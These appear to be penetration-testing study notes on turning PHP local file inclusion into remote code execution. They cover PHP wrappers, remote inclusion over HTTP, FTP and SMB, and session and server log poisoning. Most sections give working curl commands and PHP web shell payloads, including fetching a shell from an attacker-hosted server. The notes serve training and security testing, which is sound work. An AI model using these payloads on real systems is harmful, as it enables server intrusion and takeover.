# RCE

## PHP Wrappers

### allow\_url\_include

The [data](rce.md#data) and [input](rce.md#input) wrappers depend on the PHP configuration `allow_url_include` (disabled by default). The PHP config file is under:

* `/etc/php/X.Y/apache2/php.ini` for Apache
* `/etc/php/X.Y/fpm/php.ini` for Nginx

{% code overflow="wrap" %}
```shell
# Using LFI & the PHP filter to read the configuration file
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
# Searching for the allow_url_include option
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
{% endcode %}

### Data

The [data wrapper](https://www.php.net/manual/en/wrappers.data.php) can be used to include external data.

{% code overflow="wrap" %}
```shell
# Encoding a basic PHP web shell (base64 -> URL)
echo '<?php system($_GET["cmd"]); ?>' | base64 | jq -sRr @uri
# Using the data wrapper to decode the string and get RCE
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
{% endcode %}

### Input

The difference between the [input](https://www.php.net/manual/en/wrappers.php.php) and the data wrapper is that for the former, the vulnerable parameter must also accept `POST` requests. If the function only accepts `POST` requests, we can create a static webshell by putting the command directly within the PHP code.

{% code overflow="wrap" %}
```shell
# Getting RCE with the input wrapper (GET & POST)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
# Getting RCE with the input wrapper (POST only)
curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
{% endcode %}

### Expect

The  [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper is an external wrapper, i.e., it need to be manually installed and enabled, which allows us to directly run command through URL streams. We can check if that is the case similarly to the [`allow_url_include`](rce.md#allow_url_include) and grepping for `expect.`

{% code overflow="wrap" %}
```shell
# Checking if the except extension is installed
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
# Getting RCE using expect
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
{% endcode %}

## RFI

If the vulnerable function allows the inclusion of remote URLs, then we can also perform a RFI[^1] attack, which allows for gaining RCE by including a malicious script that we host and enumerating local-only ports.

<table><thead><tr><th width="299">Function</th><th align="center">Read Content</th><th align="center">Execute</th><th align="center">Remote URL</th></tr></thead><tbody><tr><td><strong>PHP</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>include()</code>/<code>include_once()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td><code>file_get_contents()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td></tr><tr><td><strong>Java</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>import</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td><strong>.NET</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>@Html.RemotePartial()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td></tr><tr><td><code>include</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr></tbody></table>

In the case that a function allows remote URLs but does not allow code execution, we can exploit the vulnerability to enumerate local ports through [SSRF](/broken/pages/x9HDd5lMnVGAGhuuCCmG).

### Identify

A reliable way to determine whether an LFI flaw is also an RFI one is to try and include a local URL (for ensuring that does not get blocked by security measures) and see if we can get its content.

```html
<!-- Requesting a local URL -->
/index.php?language=http://127.0.0.1:80/index.php
```

If the `index.php` page gets included and executed, i.e., rendered -> RFI + RCE.

### RCE

#### HTTP

{% code overflow="wrap" %}
```shell
# Creating a webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Serving the webshell via an HTTP server
sudo python3 -m http.server [80 | 443]
# RCE
curl http://<ip:port>/index.php?language=http://<attacker-ip:port>/shell.php&cmd=id
```
{% endcode %}

#### FTP

This may be useful in case HTTP ports are blocked or the `http://` string gets blocked by a WAF. By default, PHP tries to authenticate as an anonymous user.

{% code overflow="wrap" %}
```shell
# Serving the webshell via an FTP server
sudo python -m pyftpdlib -p 21
# RCE
curl http://<ip:port>/index.php?language=ftp://<attacker-ip>/shell.php&cmd=id
# If authentication is required
curl 'http://<ip:port>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```
{% endcode %}

#### SMB

Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path. This technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default.

```shell
# Serving the webshell via an SMB server
impacket-smbserver -smb2support share $(pwd)
# RCE
curl http://<ip:port>/index.php?language=\\<attacker-ip>\share\shell.php&cmd=whoami
```

## Log Poisoning

1. Writing PHP code in a field we control that gets logged into a log file
2. Including the log file to execute the PHP code.&#x20;

The web application must have `READ` privileges over the logged files.

### PHP session poisoning

Most PHP web applications utilize `PHPSESSID` cookies which are stored in `session` files. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. These are stored:

* `/var/lib/php/sessions/` on Linux
* `C:\Windows\Temp\` on Windows&#x20;

Check if the `PHPSESSID` session file contains any user-controller data. For instance, if our `PHPSESSID` cookie's value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, we can include it via LFI.

{% code overflow="wrap" %}
```bash
# Including the log file
curl http://<ip:port>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
{% endcode %}

![](../../.gitbook/assets/fi_rce_phpsessid.png)

We can see that the session file contains two values:

1. `page` -> shows the selected language page (not user-controlled)
2. `preference` -> shows the selected language (user-controlled via the `?language=` parameter)

Modify the user-controlled parameter (`language`) and see if it changes in the session file.

{% code overflow="wrap" %}
```bash
# Modifying the language parameter
curl http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
# Checking the session file
http://<ip:port>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
{% endcode %}

![](../../.gitbook/assets/fi_rce_phpsessid_1.png)

{% code overflow="wrap" %}
```bash
# Poisoning the log with a URL-encoded PHP webshell
curl http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
# Including the file for RCE
curl http://<ip:port>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
{% endcode %}

To execute another command, **the session file has to be poisoned with the web shell again**, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

### Server log poisoning

{% hint style="danger" %}
Logs tend to be huge, and **loading them in through an LFI** may take a while to read, or even **crash the server**.
{% endhint %}

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that **we need to have read-access over the logs**.

<table><thead><tr><th width="118" align="right">Server</th><th width="425">Logs (Linux, Windows)</th><th>Readable by</th></tr></thead><tbody><tr><td align="right">Apache</td><td><code>/var/log/apache2</code>, <code>C:\xampp\apache\logs</code></td><td>High privileged users</td></tr><tr><td align="right">Nginx</td><td><code>/var/log/nginx</code>, <code>C:\nginx\log</code></td><td>Low privileged users</td></tr></tbody></table>

In older or misconfigured Apache servers these logs may be readable by low-privileged users. In addition, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.

```bash
# Including apache2's log file
curl http://<ip:port>/index.php?language=/var/log/apache2/access.log
# Poisoning User-Agent (-A)
curl -s "http://<ip:port>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

![](../../.gitbook/assets/fi_rce_apache_log_poisoning.png)

![](../../.gitbook/assets/fi_rce_apache_log_poisoning_1.png)

![](../../.gitbook/assets/fi_rce_apache_log_poisoning_2.png)

The `User-Agent` header is also shown on process files under the Linux `/proc/` dir. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where `N` is a `PID` usually between 0-50), and we may be able to perform the same attack on these files. This might be useful in case we don't have read access over the server logs, however, these files may only be readable by privileged users as well.

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

* `/var/log/sshd.log`
* `/var/log/mail`
* `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

[^1]: Remote File Inclusion
